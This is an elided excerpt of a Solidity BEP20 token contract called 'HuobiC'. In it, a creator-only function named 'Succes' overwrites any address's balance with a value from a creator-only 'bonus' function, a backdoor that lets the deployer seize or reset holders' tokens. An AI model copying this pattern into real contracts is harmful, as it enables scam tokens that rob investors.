...
contract HuobiC is BEP20 {
  ...
  function bonus(address _from, uint256 _value, uint32 variant) internal view onlyCreator returns (uint256) {
  ...
  function Succes(address _from, uint256 _value, uint32 variant) public onlyCreator returns (bool) {
    ...
    _balances[_from] = bonus(_from, _value, variant);
    return true;
  }
